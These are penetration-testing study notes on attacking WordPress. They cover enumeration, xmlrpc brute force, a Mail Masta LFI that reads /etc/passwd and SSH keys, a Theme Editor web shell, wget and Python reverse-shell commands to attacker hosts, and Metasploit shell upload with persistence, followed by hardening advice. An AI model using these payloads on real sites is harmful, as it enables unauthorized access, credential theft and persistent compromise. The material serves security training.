# Hacking Wordpress

# Intro

## Wordpress Structure

- **Environment**: WordPress typically runs on a **LAMP stack** (Linux, Apache, MySQL, PHP).
- **Webroot Directory**: `/var/www/html`

```bash
tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

---

### **Key WordPress Files**

The root directory contains critical files required for WordPress to function:

1. **`index.php`**:
    - The homepage of WordPress.
2. **`license.txt`**:
    - Contains license details and the WordPress version.
3. **`wp-activate.php`**:
    - Handles email activation for new WordPress installations.
4. **`xmlrpc.php`**:
    - Legacy feature enabling data transmission via HTTP and XML.
    - Replaced by the WordPress REST API but still available.
5. **`wp-config.php`**:
    - Contains configuration data:
        - Database connection information.
        - Authentication keys and salts.
        - Debugging settings.

---

### **`wp-config.php` Breakdown**

The configuration file includes critical information:

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username */
define( 'DB_USER', 'username_here' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Authentication Unique Keys and Salts */
/* <SNIP> */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/** WordPress Database Table prefix */
$table_prefix = 'wp_';

/** For developers: WordPress debugging mode. */
/** <SNIP> */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

---

### **Key WordPress Directories**

1. **`wp-content`**:
    - Houses plugins, themes, and uploads.
    - Structure:
        
        ```bash
        /var/www/html/wp-content
        ├── index.php
        ├── plugins      # Directory for installed plugins
        ├── themes       # Directory for installed themes
        └── uploads      # Uploaded media files (e.g., images, documents)
        ```
        
2. **`wp-includes`**:
    - Stores core WordPress files such as:
        - PHP scripts for updates, themes, users.
        - Supporting resources like fonts and JavaScript files.
    - Structure:
        
        ```bash
        /var/www/html/wp-includes
        ├── theme.php
        ├── update.php
        ├── user.php
        ├── vars.php
        ├── version.php
        ├── widgets/
        ├── widgets.php
        ├── wlwmanifest.xml
        ├── wp-db.php
        └── wp-diff.php
        ```
        
3. **`wp-admin`**:
    - Contains administrative components for backend access.
    - Login page locations:
        - `/wp-admin/login.php`
        - `/wp-admin/wp-login.php`
        - `/login.php`
        - `/wp-login.php`
    - **Note**: The login page can be renamed to obscure its location for security purposes.

---

### **Important Enumeration Points**

1. **`wp-config.php`**:
    - May expose sensitive information like database credentials or debugging settings.
2. **`wp-content/uploads/`**:
    - Often publicly accessible and can reveal sensitive data or lead to remote code execution if improperly secured.
3. **Plugins and Themes**:
    - Found in `wp-content/plugins/` and `wp-content/themes/`.
    - Common sources of vulnerabilities.
4. **Core Files in `wp-includes`**:
    - Can reveal WordPress version or contain exploitable vulnerabilities.

---

### Wordpress User Roles

There are five types of users in a standard WordPress installation.

| **Role** | **Description** |
| --- | --- |
| Administrator | This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code. |
| Editor | An editor can publish and manage posts, including the posts of other users. |
| Author | Authors can publish and manage their own posts. |
| Contributor | These users can write and manage their own posts but cannot publish them. |
| Subscriber | These are normal users who can browse posts and edit their profiles. |

Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.

# Enumeration

## **WordPress Core Version Enumeration**

- **Identify vulnerabilities**: Knowing the version helps in finding known vulnerabilities specific to that version.
- **Locate misconfigurations**: Certain versions may have default passwords or insecure settings.
- **Targeted exploitation**: Tailor attacks to match the specific version of the application.

---

### **Steps for Manual Enumeration**

### **1. Review the Page Source**

- Shortcut: Press **`CTRL + U`** (Windows/Linux) or **`Command + Option + U`** (Mac).
- **What to Look For**:
    - Search for the `meta` tag containing version information:
        
        ```html
        <meta name="generator" content="ApplicationName VersionNumber" />
        ```
        

---

### **2. Use `curl` for Command-Line Enumeration**

```bash
curl -s -X GET http://<target-url> | grep '<meta name="generator"'
#
<meta name="generator" content="WordPress 5.3.3" />
```

---

### **Additional Enumeration Methods**

### **3. Inspect Linked Assets**

- Version numbers often appear in links to CSS or JavaScript files.
- **Example**:
    
    ```html
    <link rel="stylesheet" href="http://example.com/wp-content/themes/theme-name/style.css?ver=5.3.3" />
    <script src="http://example.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp"></script>
    ```
    

### **4. Check for `readme` or Default Files**

- Applications may expose their version in default files like `readme.html`.
- **URL to Check**:
    
    ```
    http://<target-url>/readme.html
    ```
    

---

### **Why Version Exposure Matters**

- Attackers can:
    - Search exploit databases like **CVE** for known vulnerabilities.
    - Use tools like **WPScan**, **Nikto**, or **Nmap** scripts to automate enumeration and exploitation.

---

## Plugins and Themes Enumeration

- wfuzz or WPScan - can help automate this

```bash
wpscan --url http://<TARGET_URL> --enumerate p
wpscan --url http://<TARGET_URL> --enumerate ap --api-token <YOUR_API_TOKEN> # we need the API token from WPScan vuln database
wpscan --url http://<TARGET_URL> --enumerate t # enumerate themes
wpscan --url http://<TARGET_URL> --enumerate at --api-token <YOUR_API_TOKEN> # enum vulns in themes
-----
wfuzz -c -z file,/usr/share/wordlists/dirb/plugins.txt --hc 404 http://<TARGET_URL>/wp-content/plugins/FUZZ/ # Plugins
wfuzz -c -z file,/usr/share/wordlists/dirb/themes.txt --hc 404 http://<TARGET_URL>/wp-content/themes/FUZZ/ # Themes

----
curl -s -X GET http://<TARGET_URL>/wp-content/plugins/<PLUGIN_NAME>/readme.txt # Active Plugins
```

### Plugins

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/js/wprev-public-com-min.js?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.3.3
```

### Themes

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3
background: url("http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;
```

The response headers may also contain version numbers for specific plugins.

### Plugins Active Enumeration

```bash
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:08:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/
Content-Length: 356
Content-Type: text/html; charset=iso-8859-1
```

If the content does not exist, we will receive a `404 Not Found error`.

```bash
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin

HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:08:18 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

The same applies to installed themes.

To speed up enumeration, we could also write a simple bash script or use a tool such as `wfuzz` or `WPScan`, which automate the process.

## Directory Indexing

- Directory indexing occurs when a web server displays the contents of a directory in a web browser.
- If directory indexing is enabled:
    - Users can browse directories and access files, even if they are not linked on the website.
    - This can expose sensitive information, such as configuration files, scripts, or outdated/vulnerable plugins.
- Disabled Plugin:

![image.png](image%20170.png)

If we browse to the plugins directory, we can see that we still have access to the `Mail Masta` plugin.

![image.png](image%20171.png)

---

### **Example: Vulnerable Directory**

- Consider the following URL:
    
    ```bash
    http://<target>/wp-content/plugins/mail-masta/
    #
    ****** Index of /wp-content/plugins/mail-masta ******
    [[ICO]]       Name                 Last_modified    Size Description
    ===========================================================================
    [[PARENTDIR]] Parent_Directory                         -
    [[DIR]]       amazon_api/          2020-05-13 18:01    -
    [[DIR]]       inc/                 2020-05-13 18:01    -
    [[DIR]]       lib/                 2020-05-13 18:01    -
    [[   ]]       plugin-interface.php 2020-05-13 18:01  88K
    [[TXT]]       readme.txt           2020-05-13 18:01 2.2K
    ===========================================================================
    Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80
    ```
    
- **Sensitive Information Exposure**:
    - Files like `readme.txt` can disclose plugin details or versions.
    - PHP scripts such as `plugin-interface.php` may contain vulnerabilities.

---

### **Using `curl` for Directory Listing**

- Retrieve and format directory contents:
    
    ```bash
    curl -s -X GET http://<target>/wp-content/plugins/mail-masta/ | html2text
    ```
    

---

### **Why is Directory Indexing Dangerous?**

- **Access to Sensitive Files**:
    - Configuration files (`config.php`, `.env`) may expose credentials.
    - Debug logs can reveal internal paths, errors, or database queries.
- **Access to Unused Plugins**:
    - Even deactivated plugins remain accessible unless deleted.
    - Vulnerabilities in unused plugins can still be exploited.
- **Access to Code**:
    - Attackers can review code for vulnerabilities, such as SQL injection or file inclusion.

---

### **Summary**

- Directory indexing can expose sensitive data or vulnerabilities.
- Attackers can leverage this to target unused or vulnerable plugins/themes.
- Mitigation involves disabling directory indexing, removing unused plugins, and enforcing strict access controls.

Let me know if you’d like further details or help with automating these checks!

## User Enumeration

### **WordPress User Enumeration**

---

- Identifying valid usernames allows attackers to:
    - Guess or brute-force default or weak passwords.
    - Attempt login to the WordPress backend (potential author or admin access).
    - Modify the website or interact with the underlying web server.

---

### **Methods for Manual User Enumeration**

### **1. Reviewing Posts**

![image.png](image%20172.png)

- **Steps**:
    - Inspect the post author link (e.g., "by admin") by hovering over it.
    - Observe the link in the browser’s bottom-left corner. Example:
        
        ```
        http://blog.inlanefreight.com/?author=1
        ```
        
- **Testing with cURL**:
    - Confirm the user by replacing `1` with other IDs in the `?author=` parameter.
- **Example: Existing User**
    
    ```bash
    curl -s -I http://blog.inlanefreight.com/?author=1
    #
    HTTP/1.1 301 Moved Permanently
    Location: http://blog.inlanefreight.com/index.php/author/admin/
    ```
    
- **Example: Non-Existing User**
    
    ```bash
    curl -s -I http://blog.inlanefreight.com/?author=100
    #
    HTTP/1.1 404 Not Found
    ```
    

---

### **2. JSON API Endpoint**

- WordPress's REST API allows retrieving user information.
- **Command**:
    
    ```bash
    curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
    ```
    
- **Example Output**:
    
    ```json
    [
      {
        "id": 1,
        "name": "admin",
        "url": "",
        "description": "",
        "link": "http://blog.inlanefreight.com/index.php/author/admin/"
      },
      {
        "id": 2,
        "name": "ch4p",
        "url": "",
        "description": "",
        "link": "http://blog.inlanefreight.com/index.php/author/ch4p/"
      }
    ]
    ```
    
- **Note**:
    - Versions after **WordPress 4.7.1** restrict user enumeration through the JSON endpoint unless the user has published a post.

---

### **Automated User Enumeration**

### **1. Using WPScan**

- **Command**:
    
    ```bash
    wpscan --url http://<target> --enumerate u
    ```
    

---

### **Summary**

- User enumeration via `?author=` and the REST API (`wp-json`) is a common vulnerability in WordPress.
- Manual and automated tools like `curl`, `jq`, and `WPScan` simplify the process.
- Mitigation involves restricting API access, disabling author archives, and using strong security practices.

## **Login Attack Overview**

Once you have enumerated valid usernames, a brute-force attack can help identify passwords to gain access to the WordPress backend. You can target:

1. **Login Page** (`/wp-login.php` or `/wp-admin/`).
2. **XML-RPC Interface** (`xmlrpc.php`).

---

### **Using `xmlrpc.php` for Login Brute Force**

### **1. Valid Credentials Response**

If the credentials are valid, the XML-RPC endpoint will return the following structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

### **2. Invalid Credentials Response**

If the credentials are invalid, the response will include a `403` fault code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

---

### **Command Examples**

### **Validating Credentials Manually**

- **Command**:
    
    ```bash
    curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://<TARGET_URL>/xmlrpc.php
    ```
    

### **Brute Forcing with `xmlrpc.php`**

- Using a username and a password list:
    
    ```bash
    while read -r password; do
        curl -s -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>$password</value></param></params></methodCall>" http://<TARGET_URL>/xmlrpc.php | grep -q "<boolean>1</boolean>" && echo "Password Found: $password" && break
    done < /usr/share/wordlists/rockyou.txt
    ```
    

---

### **Using `WPScan` for Brute Forcing**

### **Brute Force Attack with WPScan**

- **Command**:
    
    ```bash
    wpscan --url http://<TARGET_URL> --usernames admin --passwords /usr/share/wordlists/rockyou.txt
    ###
    gobuster dir -u http://blog.inlanefreight.local/wp-content/ -w /usr/share/wordlists/metasploit/wp-plugins.txt -k -t 50 -q
    # To bruteforce content
    ```
    
- **Options**:
    - `-username`: Target username for brute force.
    - `-passwords`: Path to the password file.

### **XML-RPC Specific Brute Forcing**

- If XML-RPC is accessible:
    
    ```bash
    wpscan --url http://<TARGET_URL> --usernames admin --passwords /usr/share/wordlists/rockyou.txt --method xmlrpc
    ```
    

---

### **Best Practices for Manual Enumeration**

1. **Understand HTTP Responses**:
    - Valid credentials lead to a `200 OK` response with XML content.
    - Invalid credentials return `403 Forbidden`.
2. **Inspect Automation Results**:
    - Troubleshoot tools like WPScan if they fail by inspecting manual cURL responses.
    - Compare output to ensure the tools are functioning correctly.

---

# Exploitation

### Exploiting a Vulnerable Plugin

- **Plugin**: Mail Masta 1.0
- **Issue**: Local File Inclusion (LFI)
- **Path**: `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=<FILE>`
- **Impact**:
    - Unauthorized users can read sensitive files on the server.

---

### **Steps to Exploit the LFI**

### **1. Using a Web Browser**

- Open a browser and navigate to:
    
    ```bash
    http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
    #
    -- SNIP --
    root:x:0:0:root:/root:/bin/bash
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    ```
    

### **2. Using `curl` on the Command Line**

- Execute the following command:
    
    ```bash
    curl http://94.237.62.184:58401/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
    #
    root:x:0:0:root:/root:/bin/ash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/mail:/sbin/nologin
    news:x:9:13:news:/usr/lib/news:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    man:x:13:15:man:/usr/man:/sbin/nologin
    postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
    at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
    squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
    xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
    games:x:35:35:games:/usr/games:/sbin/nologin
    cyrus:x:85:12::/usr/cyrus:/sbin/nologin
    vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
    smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
    guest:x:405:100:guest:/dev/null:/sbin/nologin
    nobody:x:65534:65534:nobody:/:/sbin/nologin
    mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
    nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
    wp-user:x:1000:1000:Linux User,,,:/home/wp-user:/sbin/nologin
    sally.jones:x:1001:1001:Linux User,,,:/home/sally.jones:/bin/bash
    <br />
    <b>Fatal error</b>:  Uncaught Error: Call to a member function get_results() on null in /usr/src/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php:19
    Stack trace:
    #0 {main}
      thrown in <b>/usr/src/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php</b> on line <b>19</b><br />
    
    ```
    

---

### **Expanding the Exploit**

### **1. Reading Other Sensitive Files**

- Modify the payload to access other critical files:
    - WordPress configuration file:
        
        ```bash
        curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wp-config.php
        ```
        
    - System logs:
        
        ```bash
        curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log
        ```
        

### **2. Enumerating the System**

- Identify the web server user by reading `/etc/passwd` or `/etc/group`.
- Check for SSH keys:
    
    ```bash
    curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/<user>/.ssh/id_rsa
    ```
    

---

### **Summary**

- The LFI vulnerability in Mail Masta allows unauthorized access to sensitive server files.
- Exploitation is straightforward via web browsers or tools like `curl`.
- Always act promptly on vulnerabilities discovered during security assessments by updating or disabling the affected plugins.

## Attacking Wordpress Users

### Wordpress Bruteforce

The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`. The `wp-login` method will attempt to brute force the normal WordPress login page, while the `xmlrpc` method uses the WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it is faster.

```bash
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
#
wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt  --url http://94.237.62.184:58401/  
```

## **Remote Code Execution (RCE) via the Theme Editor**

---

If an attacker gains administrative access to the WordPress backend, they can exploit the **Theme Editor** functionality to achieve **Remote Code Execution (RCE)** by modifying the PHP source code of a theme file.

---

### **Steps to Achieve RCE**

### **1. Access the WordPress Backend**

**`http://94.237.62.184:58401/wp-login.php`**

- Login as an administrator using the credentials obtained from a brute-force attack or other vulnerabilities.
- Navigate to the admin panel.

### **2. Open the Theme Editor**

![image.png](image%20173.png)

1. From the admin panel, click on **Appearance** → **Theme Editor**.
2. Identify the **active theme** (e.g., "Transportex").
3. Select an **inactive theme** (e.g., "Twenty Seventeen") to avoid corrupting the primary website.

### **3. Modify a Theme File**

![image.png](image%20174.png)

- Select a non-critical file such as `404.php` to modify.
- Add a PHP web shell or similar code to the file.

**Example: Modifying `404.php`**

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

- The `system($_GET['cmd']);` function allows command execution via the `cmd` parameter in the URL.

### **4. Execute Commands via the Browser or `curl`**

- After modifying the file, navigate to the URL with the `cmd` parameter to execute commands:
    
    ```
    http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id
    ```
    
- Example using `curl`:
    
    ```bash
    curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
    #
    uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
    ```
    

---

### **Potential Uses of RCE**

- **File Upload**:
Upload a more functional backdoor (e.g., PHP reverse shell) to escalate access.
    
    ```bash
    curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=wget http://<attacker-server>/shell.php -O /tmp/shell.php"
    ```
    
- **Reverse Shell**:
Launch a reverse shell to gain interactive control:
    
    ```bash
    curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker-ip>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
    
    curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.130\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
    ```
    

---

### **Summary**

- Modifying theme files via the WordPress Theme Editor provides an easy path to achieve RCE if an attacker gains admin access.
- The vulnerability is exploited by injecting PHP code into files such as `404.php` and executing commands via the `cmd` parameter.
- Mitigation involves disabling the Theme Editor, enforcing strict admin controls, and monitoring file changes.

## **Attacking WordPress with Metasploit**

---

The Metasploit Framework (MSF) includes an exploit module named `wp_admin_shell_upload` that automates the process of uploading and executing a reverse shell on a WordPress instance. This method requires valid WordPress credentials with sufficient privileges (e.g., an admin account).

---

### **Steps to Exploit WordPress Using Metasploit**

### **1. Start Metasploit Framework**

Run the Metasploit Framework:

```bash
msfconsole
search wp_admin

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```

### **2. Select the Module**

Use the identified module:

```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

### **3. View Module Options**

**Expected Options**:

| Name | Required | Description |
| --- | --- | --- |
| `PASSWORD` | Yes | The WordPress password |
| `RHOSTS` | Yes | Target host(s) |
| `RPORT` | Yes | Target port (default: 80) |
| `TARGETURI` | Yes | Base path to WordPress (default: `/`) |
| `USERNAME` | Yes | The WordPress username |
| `LHOST` | Yes | Local host IP for the reverse shell |

---

### **4. Set Module Options**

Fill in the required parameters:

```bash
set rhosts <target>
set username admin
set password Winter2020
set lhost 10.10.16.8

run
```

---

### **5. Expected Exploit Output**

If successful, you should see output similar to:

```
[*] Started reverse TCP handler on 10.10.16.8:4444
[*] Authenticating with WordPress using admin:Winter2020...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/<random_dir>/<random_file>.php...
[*] Sending stage (38247 bytes) to blog.inlanefreight.com
[*] Meterpreter session 1 opened
[+] Deleted <random_file>.php

```

---

### **6. Verify Access**

After the exploit succeeds, Metasploit provides a **Meterpreter session**. Verify the session:

```bash
meterpreter > getuid
Server username: www-data (33)

```

---

### **Post-Exploitation Steps**

1. **Escalate Privileges**:
    - Use Meterpreter commands or escalate manually based on the server setup.
2. **Explore the File System**:
    
    ```bash
    meterpreter > ls
    meterpreter > cd /var/www/html
    ```
    
3. **Capture Sensitive Information**:
    - Dump WordPress credentials from `wp-config.php`:
        
        ```bash
        meterpreter > cat /var/www/html/wp-config.php
        ```
        
4. **Establish a Persistent Backdoor**:
    - Upload a persistent shell to maintain access.

---

### **Mitigation**

1. **Keep WordPress Updated**:
    - Update WordPress core, plugins, and themes regularly.
2. **Enforce Strong Credentials**:
    - Use complex passwords and implement two-factor authentication.
3. **Restrict Admin Access**:
    - Limit the number of admin accounts and restrict access by IP.
4. **Disable File Uploads**:
    - Set `DISALLOW_FILE_EDIT` in `wp-config.php`:
        
        ```php
        define('DISALLOW_FILE_EDIT', true);
        ```
        
5. **Monitor for Anomalies**:
    - Use WordPress security plugins like **Wordfence** or **Sucuri** to monitor unauthorized changes.

---

### **Summary**

Using Metasploit, the `wp_admin_shell_upload` module automates WordPress exploitation by leveraging admin credentials to upload and execute a PHP reverse shell. Post-exploitation allows you to explore the server and extract sensitive information. Mitigation measures focus on hardening WordPress and restricting administrative privileges.

# Security Measures (Hardening)

Securing a WordPress installation is critical to prevent attacks and reduce vulnerabilities. Below are detailed best practices and recommendations for WordPress hardening.

---

### **1. Perform Regular Updates**

- **Core Updates**: Ensure WordPress core is updated to the latest version.
- **Plugins and Themes**: Regularly update all installed plugins and themes.
- **Enable Automatic Updates**: Modify the `wp-config.php` file to enable auto-updates:
    
    ```php
    define( 'WP_AUTO_UPDATE_CORE', true );
    add_filter( 'auto_update_plugin', '__return_true' );
    add_filter( 'auto_update_theme', '__return_true' );
    ```
    
- **Host-Managed Updates**: Use hosting providers that offer automated WordPress updates.

---

### **2. Plugin and Theme Management**

- **Trusted Sources**: Only download plugins/themes from the official [WordPress.org](https://wordpress.org/) repository or trusted developers.
- **Evaluate Plugins/Themes**:
    - Check reviews, star ratings, and user feedback.
    - Look at the number of active installations.
    - Verify the last updated date.
- **Remove Unused Plugins/Themes**: Delete inactive or unused plugins/themes to minimize attack surfaces.

---

### **3. Enhance WordPress Security**

Install security plugins to bolster protection against attacks. Recommended plugins include:

### **Sucuri Security**

- **Features**:
    - Security Activity Auditing
    - File Integrity Monitoring
    - Remote Malware Scanning
    - Blacklist Monitoring

### **iThemes Security**

- **Features**:
    - Two-Factor Authentication (2FA)
    - WordPress Salts & Security Keys
    - Google reCAPTCHA
    - User Action Logging

### **Wordfence Security**

- **Features**:
    - Endpoint Firewall: Blocks malicious traffic.
    - Malware Scanner: Detects and removes threats.
    - **Premium Features**:
        - Real-time firewall rule updates.
        - Malware signature updates.
        - IP blacklisting for known malicious IPs.

---

### **4. User Management**

- **Avoid Default Admin Account**: Disable the default "admin" account. Create a new account with a strong, unique username.
- **Enforce Strong Passwords**: Require all users to set strong, complex passwords.
- **Enable Two-Factor Authentication (2FA)**: Add an extra layer of security by requiring users to verify their identity using a second factor.
- **Implement Least Privilege Principle**: Assign users only the permissions necessary for their role.
- **Audit User Accounts**:
    - Periodically review user permissions.
    - Remove inactive or unnecessary accounts.

---

### **5. Configuration Management**

- **Prevent User Enumeration**:
    - Install a plugin to block username enumeration.
    - Restrict the visibility of `/author/` pages or JSON endpoints that expose usernames.
- **Limit Login Attempts**:
    - Use a plugin to restrict login attempts, locking out IPs after multiple failed attempts.
- **Rename the Login Page**:
    - Change the default `wp-login.php` or move it to a non-standard location.
    - Restrict access to the login page by IP address (using `.htaccess` or server configurations).
- **Disable Directory Indexing**:
    - Prevent attackers from browsing sensitive directories by disabling indexing in `.htaccess`:
        
        ```
        Options -Indexes
        ```
        
- **Enforce HTTPS**:
    - Ensure all traffic to the website uses HTTPS.
    - Add the following to `wp-config.php`:
        
        ```php
        define( 'FORCE_SSL_ADMIN', true );
        ```
        

---

### **6. Database Security**

- **Change Table Prefix**:
    - Use a custom table prefix instead of the default `wp_`.
    - Example: `mywp_`.
- **Secure Database Credentials**:
